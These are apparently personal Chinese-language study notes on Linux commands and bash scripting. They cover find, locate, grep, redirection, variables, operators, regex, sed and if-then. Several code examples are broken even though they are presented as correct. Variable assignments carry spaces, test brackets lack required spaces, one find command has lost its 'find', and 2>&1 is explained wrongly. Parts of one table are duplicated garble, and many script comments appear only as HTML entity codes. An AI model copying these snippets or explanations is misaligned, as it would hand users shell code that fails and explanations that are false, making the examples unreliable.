目录及子目录下所有的空文件(0字节文件) // 下面命令的输出文件绝大多数都是锁定文件盒其他程序创建的 place hoders $ find ~/ -empty //列出你 home 目录里的空文件。 $ find ~/ -maxdepth 1 -empty //列出 home目录下的非隐藏空文件。 $ find ~/ -maxdepth 1 -empty -not -name &quot;.*&quot; // 相反匹配 // 显示所有的名字不是 MyCProgram.c 的文件或者目录。 $ find -maxdepth 1 -not -iname &quot;MyCProgram.c&quot; // 在查找到的文件上执行命令 // 在查找到名为“MyCProgram.c”的文件上计算 MD5 验证和。 $ find -iname &quot;MyCProgram.c&quot; -exec md5sum {} \; // 在 /etc 目录下查找 inittab 文件并显示其详细属性 $ sudo find /etc -name initab -exec ls -l {} \; 注意：{} 将会被当前文件名取代。 -exec/-ok &amp;lt;command&amp;gt; {} \; 对搜索结果执行操作，使用 -ok 会询问是否确认。 文件大小查找 // 格式：+n 大于；-n 小于；n 等于 // 在 root 目录下查找大于100MB的文件 $ sudo find / -size +204800 注意：在 Linux 里面，1 数据块 = 512 byte = 0.5 KB，100 MB = 102400 KB = 204800 数据块 // 在 /etc 目录下查找大于 80MB 小于 100MB 的文件 $ sudo find /etc -size +163840 -a size -204800 -a 表示两个条件同时满足 -o 表示两个条件满足一个即可 //列出当前目录及子目录下的 5个最大的文件。这会需要一点时间，取决于命令需要处理的文件数量。 $ find . -type f -exec ls -s {} \; | sort -n -r | head -5 //查找 5个最小的文件 $ find . -type f -exec ls -s {} \; | sort -n | head -5 //上面的命令中，很可能你看到的只是空文件(0字节文件)。因此，你可以使用下面的命令列出最小的文件，而不是 0字节文件。 $ find . -not -empty -type f -exec ls -s {} \; | sort -n | head -5 //查找并删除大于 100M 的 *.zip 文件。 $ find / -type f -name *.zip -size +100M -exec rm -i {} \; 注意：{} 和 \ 之间是有空格的！ 根据文件变动情况查找 // 在/etc目录下查找5分钟内被修改过属性的文件和目录 $ sudo /etc -cmin -5 -amin 访问时间 access -cmin 文件属性 change -mmin 文件内容 modify // 显示所有的在 ordinary_file 之后创建修改的文件。 $ ls -lrt $ find -newer ordinary_file 根据文件类型查找 f 文件，d 目录，l 软链接，s socket文件 //查找所有的一般文件 $ find ./ -type f //查找所有的隐藏文件和目录 $ find ./ -type f -name &quot;.*&quot; $ find ./ -type d -name &quot;.*&quot; 根据文件权限、所属关系查找 $ find /home -user zrg $ find /home -group zrg // 查到当前目录下对同组用户具有读权限的文件 $ find ./ -perm -g=r -type f -exec ls -l {} \; // 找到对组用户具有只读权限的文件。 $find ./ -perm g=r -type f -exec ls -l {} \; // 找到对组用户具有只读权限的文件(使用八进制权限形式)。 $ find ./ -perm 040 -type f -exec ls -l {} \; 使用 inode 编号查找 //任何一个文件都有一个独一无二的 inode 编号，借此我们可以区分文件。 //使用选项 -i，可以看到文件的 inode 编号，借此可以区分这两个文件。 $ ls -i1 test* 16187429 test-file-name 16187430 test-file-name //使用 inode 编号来删除那些具有特殊符号的文件名。 $ find -inum 16187430 -exec rm {} \; 3.3.2 locate 命令 该命令建立了一个文件资料库，查找文件时直接在资料库中查找。类似 Windows 下的 Everything 工具。 // 安装： $ sudo apt install mlocate // 使用 $ locate init 注意：locate 命令不会查找/tmp目录下内容。 // 更新文件资料库： $ updatedb 3.3.3 which 和 where 命令 用于查找某个命令(Locate a command) $ which ls $ where useradd 3.3.4 grep 命令 语法格式：grep -iv [指定字符串][文件] -i 不区分大小写 -v 排除指定字符串 // 查找指定字符串的行并显示 $ grep 123 test.txt // 去掉# 注释行 $ grep -v ^# config.txt 3.4 Linux Compression and Packaging 另外还有不常见的，但时有遇到的： .tar.xz $ tar xpvf file.tar.xz .tgz $ tar zxf name.tgz //解压到指定目录 $ unzip name.zip -d ./dir 3.5 Linux Disk and File System 3.5.1 格式化分区命令 将 /dev/sda7 硬盘格式化为 ext3 格式。 $ mkfs -t ext3 -c /dev/sda7 3.6 ～～～ 3.6.1 网络命令 write 描述 给指定用户发送信息(send a message to another user)，Ctrl+D 保存结束 格式: write user [tty] 实践 wall 描述 发送广播信息(write a message to all users) 格式: wall [-n] [-t timeout] [message | file] 实践 ping 描述 测试网络联通性(send ICMP ECHO_REQUEST to network hosts) 实践 指定ping次数 $ ping -c 4 baidu.com ifconfig 描述 configure a network interface 实践 mail 描述 查看/发送电子邮件 实践 last &amp;amp; lastlog 描述 列出目前/过去登入系统的用户信息 last, lastb - show a listing of last logged in users last [options] [username...] [tty...] lastb [options] [username...] [tty...] 列出用户最后一次登录系统的信息 lastlog - reports the most recent login of all users or of a given user lastlog [options] 实践 traceroute 描述 追踪数据包到主机间的路径 traceroute - print the route packets trace to network host 实践 netstat 描述 显示网络相关信息 netstat - Print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships 实践 查看主机对外开放端口 $ netstat -ntlp 查看本机监听的端口 $ netstat -tlun 查看本机所有的网络连接 $ netstat -ano 查看本机路由表 $ netstat -rn setup 描述 配置网络 实践 4 Shell Scripts Programming 4.1 Learning Shell 4.1.1 学习 Shell 的疑惑 如何启动命令行以及接下来做什么？ 如何使用 shell脚本来自动处理系统管理任务，包括从检测系统统计数据和数据文件到为你的老板生成报表？ 4.1.2 认识常见的 Shell 类型 /bin/bash /bin/tcsh /bin/dash /bin/csh /bin/sh &amp;#x2026; 4.1.3 Shell 的父子关系 $ ps -f UID PID PPID C STIME TTY TIME CMD zrg 25305 4834 8 23:51 pts/4 00:00:00 -bash zrg 25317 25305 0 23:51 pts/4 00:00:00 ps -f $ bash $ ps -f UID PID PPID C STIME TTY TIME CMD zrg 25305 4834 0 23:51 pts/4 00:00:00 -bash zrg 25347 25305 0 23:53 pts/4 00:00:00 bash zrg 25352 25347 0 23:54 pts/4 00:00:00 ps -f 输入命令之后，一个子 shell 就出现了。第二个 ps -f 是在子 shell 中执行的。可以从显示结果中看到两个 bash shell 程序在运行。 $ bash $ bash $ bash $ ps --forest PID TTY TIME CMD 25305 pts/4 00:00:00 bash 25347 pts/4 00:00:00 \_ bash 25372 pts/4 00:00:00 \_ bash 25377 pts/4 00:00:00 \_ bash 25382 pts/4 00:00:00 \_ ps 在上面例子中，bash 命令被输入了三次。实际上创建了三个子 shell。ps &amp;#x2013;forest 命令展示了这些子 shell 间的嵌套结构。可以使用 exit 命令退出子 shell $ exit 进程列表 $ pwd;ls;cd /etc;pwd /home/zrg/zhaorengui.github.io 404.html archives categories _config.yml _drafts Gemfile.lock index.html _orgs README.en.md _sass _site tags about assets category _data Gemfile _includes _layouts _posts README.md search.xml tag /etc 在命令之间加入“;，指定要依次执行的一系列命令 $ (pwd;ls;cd /etc;pwd) /home/zrg/zhaorengui.github.io 404.html archives categories _config.yml _drafts Gemfile.lock index.html _orgs README.en.md _sass _site tags about assets category _data Gemfile _includes _layouts _posts README.md search.xml tag /etc 使用括号包含命令，成为进程列表 查看是否生成了子 shell，使用： $ echo $BASH_SUBSHELL 子shell用法 // 在后台睡眠10s $ sleep 10&amp;amp; // 查看后台进程 $ ps -f or $ jobs -l //将进程列表置入后台 $ (sleep 2;echo $BASH_SUBSHELL;sleep 2)&amp;amp; // 创建备份 $ (tar -cf Rich.rar /home/rich;tar -cf My.tar /home/christine)&amp;amp; //协程：在后台生成一个子shell，同时在这个子shell中执行命令。 // 进行协程处理，使用 coproc 命令 $ coproc sleep 10 $ coproc My_Job{sleep 10;} 4.1.4 理解 shell 的内建命令 外部命令 :: 也被称为文件系统命令，是存在于bash shell之外的程序。ps 就是一个外部命令，可以使用 which 和 type 命令找到 $ which ps $ type -a ps 当外部命令执行时，会创建一个子进程，这种操作叫做衍生（forking）。 内建命令 :: 内建命令和外部命令的区别在于前者不需要使用子进程来执行。它们已经和 shell 编译成一体，作为 shell 工具的组成部分存在。可以利用 type 命令来了解某个命令是否是内建的。 $ type cd cd is a shell builtin 要注意，有些命令有多种实现。既有内建命令也有外部命令。 $ type -a echo echo is a shell builtin echo is /bin/echo $ type -a pwd pwd is a shell builtin pwd is /bin/pwd 4.2 Shell Basic 4.2.1 第一个 shell 程序：Hello World! 首先，新建并编辑一个名为 hello.sh 的文件 $ vim hello.sh #!/bin/bash #&amp;#21578;&amp;#35785;shell&amp;#29992;/bin/bash&amp;#26469;&amp;#36816;&amp;#34892;&amp;#33050;&amp;#26412;&amp;#12290; # This script displays the date and who's #&amp;#33050;&amp;#26412;&amp;#29992;&amp;#36884;&amp;#35828;&amp;#26126;&amp;#21450;&amp;#20316;&amp;#32773;&amp;#31561;&amp;#20449;&amp;#24687;&amp;#25551;&amp;#36848; echo &quot;This's is a shell script.&quot; #&amp;#26174;&amp;#31034;&amp;#28040;&amp;#24687; echo -n &quot;The time and date are: &quot; #n&amp;#34920;&amp;#31034;&amp;#22312;&amp;#19968;&amp;#34892;&amp;#26174;&amp;#31034; echo &quot;Hello,World!&quot; # print &quot;Hello,World!&quot; date # print date. echo &quot;User info for userid: $USER&quot; #&amp;#29615;&amp;#22659;&amp;#21464;&amp;#37327;&amp;#65292;&amp;#29992;set&amp;#21629;&amp;#20196;&amp;#21487;&amp;#20197;&amp;#26597;&amp;#30475;&amp;#19968;&amp;#20221;&amp;#23436;&amp;#25972;&amp;#30340;&amp;#24403;&amp;#21069;&amp;#29615;&amp;#22659;&amp;#21464;&amp;#37327;&amp;#21015;&amp;#34920;&amp;#12290; echo UID: $UID echo HOME: $HOME echo &quot;The cost of the item is \$15.&quot; #&amp;#32654;&amp;#20803;&amp;#38656;&amp;#35201;&amp;#20351;&amp;#29992;\&amp;#36716;&amp;#20041; days = 10 #&amp;#29992;&amp;#25143;&amp;#33258;&amp;#23450;&amp;#20041;&amp;#21464;&amp;#37327; echo $days # &amp;#26377;&amp;#20004;&amp;#31181;&amp;#26041;&amp;#27861;&amp;#21487;&amp;#20197;&amp;#23558;&amp;#21629;&amp;#20196;&amp;#36171;&amp;#32473;&amp;#21464;&amp;#37327; test = `date` #&amp;#29992;&amp;#19968;&amp;#23545;&amp;#21453;&amp;#24341;&amp;#21495;&amp;#25226;&amp;#25972;&amp;#20010;&amp;#21629;&amp;#20196;&amp;#22260;&amp;#36215;&amp;#26469; test = $(date) #&amp;#20351;&amp;#29992;$()&amp;#26684;&amp;#24335; today = $(date+%y%m%d) #today&amp;#21464;&amp;#37327;&amp;#34987;&amp;#36171;&amp;#20104;&amp;#26684;&amp;#24335;&amp;#21270;&amp;#21518;&amp;#30340;date&amp;#21629;&amp;#20196;&amp;#30340;&amp;#36755;&amp;#20986;&amp;#12290; 此时，我们想看看运行效果，需要给 hello.sh 可执行(x)权限 $ sudo chmod +x hello.sh 执行，查看效果 $ ./hello.sh 4.2.2 历史命令与补全(tab键) 历史命令的调用 查看历史命令 $ history 使用上、下箭头调用之前的命令 使用“!n”重复执行第 n条历史命令 使用“!!”重复执行上一条命令 使用“!&amp;lt;string&amp;gt;”重复执行最后一条以某个字符串开头的命令 使用 &amp;lt;tab&amp;gt; 键可以对命令、文件、目录等进行自动补全。 4.2.3 设置命令别名：alias //利用别名代替长命令 $ vim ~/.bashrc : //存在这样的三行代码，意思就是检查是否存在 .bash_aliases 文件，存在就加载 if [ -f ~/.bash_aliases ]; then . ~/.bash_aliases fi //于是,新建并编辑 $ vim .bash_aliases #shadowsocks alias shadowsocks=&quot;sudo sslocal -c /etc/shadowsocks.json -d start&quot; 4.2.4 重定向输入和输出 Table 12: 重定向字符 0 标准输入 1 标准输出 2 标准错误输出 &amp;gt; 默认为标准输出重定向，与 &amp;gt;1 相同 2&amp;gt;&amp;amp;1 把标准输出重定向到标准输出 &amp;amp;&amp;gt;file 把标准输出和标准错误输出都重定向到 file 中 /dev/null 是一个特殊文件，所有重定向到它的东西都丢弃掉 输出重定向 // 标准输出重定向 $ date &amp;gt; test $ date &amp;gt;&amp;gt; test // 标准错误输出重定向 $ date 2&amp;gt;test $ date 2&amp;gt;&amp;gt;test // 正确输出和错误输出同时保存 $ date &amp;gt; test 2&amp;gt;&amp;amp;1 $ date &amp;gt;&amp;gt; test 2&amp;gt;&amp;amp;1 $ date &amp;amp;&amp;gt;test $ date &amp;amp;&amp;gt;&amp;gt;test $ date &amp;gt;&amp;gt;test1 2&amp;gt;&amp;gt;test2 输入重定向 // 输入重定向 $ wc &amp;lt; test //wc 命令，默认情况下，会输出3个值： 文本的行数 文本的词数 文本的字节数 // 内联输入重定向(inline input redirection) $ wc &amp;lt;&amp;lt; EOF shell 会用PS2环境变量中定义的次提示符来提示输入数据 4.2.5 多命令顺序执行与管道符 // 同时执行 $ ls -lht;less test.txt $ cd ~/test &amp;amp;&amp;amp; touch hello.sh // 管道运算符 $ rpm -qa | sort 4.2.6 通配符 shell通配符(wildcard) Table 13: shell 常见通配符 字符 含义 实例 &amp;lowast; 匹配 0 或多个字符 a*b a与b之间可以有任意长度的任意字符, 也可以一个也没有, 如aabcb, axyzb, a012b, ab。 ? 匹配任意一个字符 a?b a与b之间必须也只能有一个字符, 可以是任意字符, 如aab, abb, acb, a0b。 [list] 匹配 list 中的任意单一字符 a[xyz]b a与b之间必须也只能有一个字符, 但只能是 x 或 y 或 z, 如: axb, ayb, azb。 [!list] 匹配 除list 中的任意单一字符 a[!0-9]b a与b之间必须也只能有一个字符, 但不能是阿拉伯数字, 如axb, aab, a-b。 [c1-c2] 匹配 c1-c2 中的任意单一字符 如：[0-9] [a-z] a[0-9]b 0与9之间必须也只能有一个字符 如a0b, a1b&amp;#x2026; a9b。 {string1,string2,&amp;#x2026;} 匹配 sring1 或 string2 (或更多)其一字符串 a{abc,xyz,123}b a与b之间只能是abc或xyz或123这三个字符串之一。 shell 特殊字符 shell 除了有通配符之外，由shell 负责预先先解析后，将处理结果传给命令行之外，shell还有一系列自己的其他特殊字符。 Table 14: shell 特殊字符 字符 说明 IFS 由 &amp;lt;space&amp;gt; 或 &amp;lt;tab&amp;gt; 或 &amp;lt;enter&amp;gt; 三者之一组成(我们常用 space )。 CR 由 &amp;lt;enter&amp;gt; 产生。 = 设定变量。 $ 作变量或运算替换(请不要与 shell prompt 搞混了)。 &amp;gt; 重导向 stdout。 * &amp;lt; 重导向 stdin。 * &amp;#xa0; 命令管线。 * &amp;amp; 重导向 file descriptor ，或将命令置于背境执行。 * ( ) 将其内的命令置于 nested subshell 执行，或用于运算或命令替换。 * { } 将其内的命令置于 non-named function 中执行，或用在变量替换的界定范围。 ; 在前一个命令结束时，而忽略其返回值，继续执行下一个命令。 * &amp;amp;&amp;amp; 在前一个命令结束时，若返回值为 true，继续执行下一个命令。 * 两个竖线 在前一个命令结束时，若返回值为 false，继续执行下一个命令。 * &amp;iexcl; 执行 history 列表中的命令。* shell 转义符 Table 15: shell 转义符号 字符 说明 ‘’(单引号) 又叫硬转义，其内部所有的shell 元字符、通配符都会被关掉。注意，硬转义中不允许出现’(单引号)。 “”(双引号) 又叫软转义，其内部只允许出现特定的shell 元字符：$用于参数代换 `用于命令代替 \(反斜杠) 又叫转义，去除其后紧跟的元字符或通配符的特殊意义。 shell 解析脚本过程 4.2.7 环境变量 概念：环境变量（environment variable），用来存储有关 shell 会话和工作环境的信息。 全局环境变量和局部环境变量: // 查看全局变量 $ env or $ printenv // 查看某个全局环境变量 $ env HOME or $ echo $HOME // set 命令会显示为某个特定进程设置的所有环境变量，包括全局变量、局部变量以及用户自定义变量。 $ set 设置用户自定义变量 $ my_variable=Hello 注意：所有环境变量名均使用大写字母，这是 bash shell 的标准惯例。自己创建的局部变量或是 shell 脚本，请使用小写字母。变量名区分大小写。 $ my_variable=&quot;Hello World&quot; // 设置全局变量 $ export my_variable=&quot;I am Global now&quot; // 删除环境变量 $ unset my_variable 注意：如果要用到变量，使用$；如果要操作变量，不使用$。 PATH、PS1 环境变量 // 全局环境变量 $ PATH=$PATH:/opt/test/scripts // 自定义用户命令行的字符显示 PS1 默认提示符变量，如动态显示当前目录： $ export PS1=&quot;[\u@\h \w]&quot; Table 16: PS1 变量可使用的参数值 \d 代表日期，格式为weekday month date，例如：&quot;Mon Aug 1&quot; \H 完整的主机名称。例如：我的机器名称为：fc4.linux，则这个名称就是fc4.linux \h 仅取主机的第一个名字，如上例，则为fc4，.linux则被省略 \t 显示时间为24小时格式，如：HH：MM：SS \T 显示时间为12小时格式 \A 显示时间为24小时格式：HH：MM \u 当前用户的账号名称 \v BASH的版本信息 \w 完整的工作目录名称。家目录会以 ~代替 \W 利用basename取得工作目录名称，所以只会列出最后一个目录 \# 下达的第几个命令 \$ 提示字符，如果是root时，提示符为：# ，普通用户则为：$ \[ 字符&quot;[&quot; \] 字符&quot;]&quot; \! 命令行动态统计历史命令次数 PS2 是副提示符变量，默认值是''&amp;gt; ''。PS2一般使用于命令行里较长命令的换行提示信息。可自定义设置如下： $ export PS2=&quot;PS2 =&amp;gt; &quot; 另外，还有 PS3 和 PS4，因为这两个环境变量可能用得不多，所以在这就不介绍了，感兴趣的小伙伴可自行研究。 定位系统环境变量 登录时作为默认登录 shell 登录 shell 会从5个不同的启动文件里读取命令，其中 /etc/profile 是默认的 bash shell 主启动文件。 $HOME/.bash_profile $HOME/.bashrc $HOME/.bash_login $HOME/.profile 作为非登录 shell 的交互式 shell 作为非登录 shell 的交互式启动的，它不会访问 /etc/profile 文件，只会检查 HOME 目录中的 .bashrc 文件。 .bashrc 文件有两个作用：一是查看/etc目录下通用的 bashrc 文件；二是为用户提供一个定制自己的命名别名和私有脚本函数的地方。 作为运行脚本的非交互式shell 系统执行 shell 脚本时使用，不同的地方在于它没有命令提示符。bash shell 提供了 BASH_ENV 环境变量，当 shell 启动一个非交互式 shell 进程时，它会检查这个环境变量来查看要执行的启动文件。 在大多数发行版中，存储个人用户永久性 bash shell 变量的地方是 $HOME/.bashrc 文件。但如果设置了 BASH_ENV 变量，那么记住，除非它指向的是 $HOME/.bashrc，否则应该将非交互式 shell 的用户变量放在别的地方。 数组变量 // 环境变量作为数组使用 $ mytest=(one two three four five) $ echo ${mytest[2]} three $ echo ${mytest[*]} one two three four five //改变某个索引的值 $ mytest[2] = seven //删除某个索引的值和删除整个数组 $ unset mytest[2] $ unset mytest 环境变量配置文件 /etc/profile /etc/profile.d/*.sh ~/.bash_profile ~/.bashrc /etc/bashrc ~/.bash_logout ~/.bash_history 本地终端欢迎信息 登录后的欢迎信息 4.2.8 位置参数(positional parameter) Table 17: 位置参数 位置参数变量 说明 $n n为自然数。0代表命令本身，0代表命令本身，1到9代表第1到第9个参数（参数的值是执行该命令时，从9代表第1到第9个参数（参数的值是执行该命令时，从1开始依次输入的），十以上的参数要用大括号包含，如${10}。 $* 这个变量代表命令行中所有的参数（不包括$0），它把所有的参数当做一个整体对待。对其进行for循环遍历时，只会循环一次。 $@ 这个变量也代表命令行中所有的参数（不包括$0），它把所有的参数当做独立的个体对待。对其进行for循环遍历时，可循环多次。 $# 这个变量代表命令行中所有参数的个数（不包括$0）。 #!/bin/bash # using one command line parameter # factorial=1 for ((number=1; number&amp;lt;=$1; number++)) do factorial=$[$factorial * $number] done echo &quot;The factorial of $1 is $factorial&quot; 4.2.9 预定义变量 常见的预定义变量 Table 18: 常见的预定义变量 预定义常量 作用 0 存当前程序或脚本的名称 $* 保存传递给脚本或进程的所有参数 $$ 当前进程给脚本的PID号 $! 后台运行的最后一个进程的PID号 $? 用于返回上一条命令是否成功执行。如果成功执行，将返回数字0，否则返回非零数字（通常情况下都返回数字1）。 $# 用于保存脚本的参数个数 从键盘输入 read 命令 选项 -p等待输入时的提示信息 -t等待秒数 -n允许输入的字符数 -s隐藏输入的数据，适用于机密信息的输入 示例 #!/bin/bash # Date: 2019/07/27 # Author: zrg # # Enter a variable name read -p &quot;Please enter a variable name:&quot; -t 15 varName echo &quot;\n&quot; echo $varName 4.2.10 执行数学运算和运算符 方法1：declare $ declare -i c=$a+$b $ echo $c 方法2：expr 或 let 运算工具 $ c=$(expr $a +$b) $ echo c 方法3：$((表达式)) 或 $[表达式] $ var1=$((1+5)) $ var2=$[$var1*2] // 使用 $ 和 [] 将数学表达式围起来 注意：bash shell数学运算符支持整数运算。z shell（zsh）提供了完整的浮点数算术操作。 浮点运算解决方案 使用内建的bash计算器：bc $ bc 3.44 / 5 0 scale = 4 // 浮点运算由scale控制，默认值为0 注意：-q 选项可以不显示冗长的欢迎信息 $ bc -q #!/bin/bash var1 = $(echo &quot;scale=4;3.44 / 5&quot; | bc) echo The answer is $var1 #!/bin/bash var1= 10.46 var2= 43.67 var3= 33.2 var4= 71 var5= $(bc &amp;lt;&amp;lt; EOF scale= 4 a1= ($var1*$var2) a2= ($var3*var4) a1+b1 EOF ) echo &quot;The final answer for this mess is $var5&quot; 运算符 算术运算符 Table 19: 算术运算符 运算符 说明 举例 + 加法 `expr $a + $b` 结果为 30。 - 减法 `expr $a - $b` 结果为 -10。 &amp;lowast; 乘法 `expr $a \* $b` 结果为 200。 / 除法 `expr $b / $a` 结果为 2。 % 取余 `expr $b % $a` 结果为 0。 = 赋值 a=$b 将把变量 b 的值赋给 a。 == 相等。用于比较两个数字，相同则返回 true。 [ $a == $b ] 返回 false。 != 不相等。用于比较两个数字，不相同则返回 true。 [ $a != $b ] 返回 true。 注意：条件表达式要放在方括号之间，并且要有空格，例如: [$a==$b] 是错误的，必须写成 [ $a == $b ]。 关系运算符 Table 20: 关系运算符 运算符 说明 举例 -eq 检测两个数是否相等，相等返回 true。 [ $a -eq $b ] 返回 false。 -ne 检测两个数是否不相等，不相等返回 true。 [ $a -ne $b ] 返回 true。 -gt 检测左边的数是否大于右边的，如果是，则返回 true。 [ $a -gt $b ] 返回 false。 -lt 检测左边的数是否小于右边的，如果是，则返回 true。 [ $a -lt $b ] 返回 true。 -ge 检测左边的数是否大于等于右边的，如果是，则返回 true。 [ $a -ge $b ] 返回 false。 -le 检测左边的数是否小于等于右边的，如果是，则返回 true。 [ $a -le $b ] 返回 true。 布尔运算符 Table 21: 布尔运算符 运算符 说明 举例 &amp;iexcl; 非运算，表达式为 true 则返回 false，否则返回 true。 [ ! false ] 返回 true。 -o 或运算，有一个表达式为 true 则返回 true。 [ $a -lt 20 -o $b -gt 100 ] 返回 true。 -a 与运算，两个表达式都为 true 才返回 true。 [ $a -lt 20 -a $b -gt 100 ] 返回 false。 逻辑运算符 Table 22: 逻辑运算符 运算符 说明 举例 &amp;amp;&amp;amp; 逻辑的 AND [ $a -lt 100 &amp;amp;&amp;amp; $b -gt 100 ] 返回 false || 逻辑的 OR [ $a -lt 100 || $b -gt 100 ] 返回 true 注意：“|”，可通过 M-x org-entities-help &amp;lt;RET&amp;gt; 查看，Other &amp;gt; Misc 字符串运算符 Table 23: 字符串运算符 运算符 说明 举例 = 检测两个字符串是否相等，相等返回 true。 [ $a = $b ] 返回 false。 != 检测两个字符串是否相等，不相等返回 true。 [ $a != $b ] 返回 true。 -z 检测字符串长度是否为0，为0返回 true。 [ -z $a ] 返回 false。 -n 检测字符串长度是否为0，不为0返回 true。 [ -n &quot;$a&quot; ] 返回 true。 $ 检测字符串是否为空，不为空返回 true。 [ $a ] 返回 true。 文件测试运算符 Table 24: 文件测试运算符 操作符 说明 举例 -b file 检测文件是否是块设备文件，如果是，则返回 true。 [ -b $file ] 返回 false。 -c file 检测文件是否是字符设备文件，如果是，则返回 true。 [ -c $file ] 返回 false。 -d file 检测文件是否是目录，如果是，则返回 true。 [ -d $file ] 返回 false。 -f file 检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。 [ -f $file ] 返回 true。 -g file 检测文件是否设置了 SGID 位，如果是，则返回 true。 [ -g $file ] 返回 false。 -k file 检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。 [ -k $file ] 返回 false。 -p file 检测文件是否是有名管道，如果是，则返回 true。 [ -p $file ] 返回 false。 -u file 检测文件是否设置了 SUID 位，如果是，则返回 true。 [ -u $file ] 返回 false。 -r file 检测文件是否可读，如果是，则返回 true。 [ -r $file ] 返回 true。 -w file 检测文件是否可写，如果是，则返回 true。 [ -w $file ] 返回 true。 -x file 检测文件是否可执行，如果是，则返回 true。 [ -x $file ] 返回 true。 -s file 检测文件是否为空（文件大小是否大于0），不为空返回 true。 [ -s $file ] 返回 true。 -e file 检测文件（包括目录）是否存在，如果是，则返回 true。 [ -e $file ] 返回 true。 -S 判断某文件是否 socket。 &amp;#xa0; -L 检测文件是否存在并且是一个符号链接。 &amp;#xa0; 4.2.11 变量测试 变量测试主要在 Shell 中使用，其它绝大多数语言是没有这个概念的，通用度不高。而且变量测试比较复杂，在实际写脚本的过程中完全可以用其它方式来取代变量测试。 Table 25: 变量测试表 变量置换方式 y 没有设置 y 为空 y 设置值 x=${y-变量} x=newValue x为空 x=$y x=${y:-变量} x=newValue x=newValue x=$y x=${y+变量} x为空 x=newValue x=newValue x=${y:-变量} x为空 x为空 x=newValue x=${y=变量} x=newValue x为空 x=$y &amp;#xa0; y=newValue y值不变 y值不变 x=${y:=变量} x=newValue x=newValue x=$y &amp;#xa0; y=newValue y=newValue y值不变 x=${y?变量} newValue 输出到标准错误输出 x为空 x=$y x=${y:?变量} newValue 输出到标准错误输出 newValue 输出到标准错误输出 x=$y x=${y-4} // 表示如果y不存在，那么x=4；如果y为空值，那么x为空值；如果y有值，那么x被赋y的值。 4.2.12 退出脚本 退出状态码 Table 26: 退出状态码 状态码 描述 0 命令成功结束 1 一般性未知错误 2 不适合的shell命令 126 命令不可执行 127 没找到命令 128 无效的退出参数 128+x 与Linux信号x相关的严重错误 130 通过Ctrl+C终止的命令 255 正常范围之外的退出状态码 $ echo $? 0 exit echo 'Hello, World' exit 5 $ ./test Hello, World $ echo $? 5 4.3 Shell Programming 4.3.1 正则表达式 Table 27: 正则表达式的基本组成部分 正则表达式 描述 示例 \ 转义符，将特殊字符进行转义，忽略其特殊意义 a\.b匹配a.b，但不能匹配ajb，.被转义为特殊意义 ^ 匹配行首，awk中，^则是匹配字符串的开始 ^tux匹配以tux开头的行 $ 匹配行尾，awk中，$则是匹配字符串的结尾 tux$匹配以tux结尾的行 . 匹配除换行符\n之外的任意单个字符，awk则中可以 ab.匹配abc或bad，不可匹配abcd或abde，只能匹配单字符 [] 匹配包含在[字符]之中的任意一个字符 coo[kl]可以匹配cook或cool [^] 匹配[^字符]之外的任意一个字符 123[^45]不可以匹配1234或1235，1236、1237都可以 [-] 匹配[]中指定范围内的任意一个字符，要写成递增 [0-9]可以匹配1、2或3等其中任意一个数字 ? 匹配之前的项1次或者0次 colou?r可以匹配color或者colour，不能匹配colouur不支持 + 匹配之前的项1次或者多次 sa-6+匹配sa-6、sa-666，不能匹配sa-不支持 &amp;lowast; 匹配之前的项0次或者多次 co*l匹配cl、col、cool、coool等 () 匹配表达式，创建一个用于匹配的子串 ma(tri)?匹配max或maxtrix不支持()()() {n} 匹配之前的项n次，n是可以为0的正整数 [0-9]{3}匹配任意一个三位数，可以扩展为[0-9][0-9][0-9]不支持 {n,} 之前的项至少需要匹配n次 [0-9]{2,}匹配任意一个两位数或更多位数不支持 {n,m} 指定之前的项至少匹配n次，最多匹配m次，n&amp;lt;=m [0-9]{2,5}匹配从两位数到五位数之间的任意一个数字不支持 | 交替匹配 | 两边的任意一项ab(c d)匹配abc或abd不支持 参考：https://man.linuxde.net/docs/shell_regex.html 4.3.2 字符操作 sed 一款几乎包括所有 UNIX 体系的轻量级流编辑器，主要用来进行数据的提取、替换、删除、新增。 // 查看文件的第2行 $ sed -n '2p' test.txt // 删除从第2行到第4行的数据 $ sed '2,4d' test.txt // 在第2行追加hello $ sed '2a hello' test.txt // 在第2行前插入两行数据 $ sed '2i hello \ wold' test.txt // 数据替换 $ sed '2c No such person' test.txt 字符串替换 $ sed 's/oldStr/newStr/g' fileName // 将某个目录下的所有文件中的某个字符进行替换成新字符串，格式如下： $ sed -i 's/oldStr/newStr/g' `grep oldStr -rl /path` awk sort wc 4.3.3 结构化命令 if-then #!/bin/bash testuser = zrg # if grep $testuser /etc/passwd then echo &quot;The bash files for user $testuser are:&quot; ls -a /home/$testuser/.b* echo elif ls -d /home/$testuser then echo &quot;The user $testuser has a directory&quot; else echo &quot;The user $testuser does not exist on this system.&quot; echo fi #test&amp;#21629;&amp;#20196;&amp;#25552;&amp;#20379;&amp;#20102;&amp;#22312;if-then&amp;#35821;&amp;#21477;&amp;#20013;&amp;#27979;&amp;#35797;&amp;#19981;&amp;#21516;&amp;#26465;&amp;#20214;&amp;#30340;&amp;#36884;&amp;#24452;&amp;#12290; #test&amp;#21629;&amp;#20196;&amp;#21487;&amp;#20197;&amp;#21028;&amp;#26029;&amp;#19977;&amp;#31867;&amp;#26465;&amp;#20214;&amp;#65306;&amp;#25968;&amp;#20540;&amp;#27604;&amp;#36739;&amp;#65307;&amp;#23383;&amp;#31526;&amp;#20018;&amp;#27604;&amp;#36739;&amp;#65307;&amp;#25991;&amp;#20214;&amp;#27604;&amp;#36739; test 命令 格式： if test condition then commands fi 如果 test 命令中列出的条件成立，退出并返回退出状态码0；如果条件不成立，退出并返回非零的退出状态码。 #!/bin/bash $var = 10 if [$var -eq 5] then echo &quot;The value $var are equal.&quot; else echo &quot;The value $var are different.&quot; fi $var1 = baduser if [$USER != $var1] then echo &quot;This is not $var1&quot; else echo &quot;Welcome $var&quot; fi $var2 = baseall $var3 = hockey if [$var2 \&amp;gt; $var3] #&amp;gt;&amp;#31526;&amp;#21495;&amp;#38656;&amp;#35201;&amp;#36716;&amp;#20041;&amp;#65292;&amp;#38450;&amp;#27490;&amp;#35299;&amp;#37322;&amp;#25104;&amp;#36755;&amp;#20986;&amp;#37325;&amp;#23450;&amp;#21521; then echo &quot;$var2 is greater than $var3&quot; else echo &quot;$var2 is less than $var3&quot; fi 特别说明： 1.test命令和测试表达式使用标准的数学比较符号来表示字符串比较，而用文本代码来表示数值比较。 2.比较测试时，大写字母被认为是小于小写字母，但sort命令恰好相反。 #!/bin/bash 